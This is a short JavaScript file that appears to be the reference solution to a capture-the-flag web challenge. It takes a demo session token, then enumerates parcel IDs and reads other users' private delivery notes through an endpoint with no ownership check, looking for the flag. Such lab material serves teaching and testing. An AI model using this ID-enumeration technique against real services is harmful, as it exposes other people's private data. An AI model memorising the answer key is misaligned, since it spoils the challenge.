// Reference solve — Courier, Acolyte. Open a demo session, then read a foreign parcel's detail directly (no ownership
// check). Enumerate the 1xxx id block (your own are 2xxx); the flag is a parcel's private delivery note.
const base = process.argv[2];
const { token } = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { headers: { authorization: `Bearer ${token}` } };
for (let id = 1000; id <= 1010; id++) {
  const r = await fetch(`${base}/api/parcels/${id}`, auth);
  if (!r.ok) continue;
  const { note } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(note ?? '');
  if (m) { console.log(m[0]); break; }
}
